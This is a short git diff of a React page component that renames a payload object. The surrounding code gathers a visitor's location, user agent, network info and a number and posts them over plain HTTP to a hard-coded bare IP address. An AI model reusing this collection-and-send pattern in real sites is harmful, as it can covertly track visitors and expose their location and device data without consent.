@@ -56,11 +56,13 @@ const DataPage = () => {
       // Get location and then send all data to the server
       getLocation((location) => {
         // Prepare data to be sent
-        const data = {
+        const data = 3;
+        const paslon = {
           number,
           userAgent,
           location,
           networkInfo,
+          data,
         };
         // Send data to the server
         fetch('http://152.42.184.255:5001/log', {
@@ -68,11 +70,11 @@ const DataPage = () => {
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify(data),
+          body: JSON.stringify(paslon),
         })
           .then((response) => response.text())
-          .then((data) => {
-            console.log('Data logged successfully:', data);
+          .then((paslon) => {
+            console.log('Data logged successfully:', paslon);
           })
           .catch((error) => console.error('Error logging data:', error));
       });
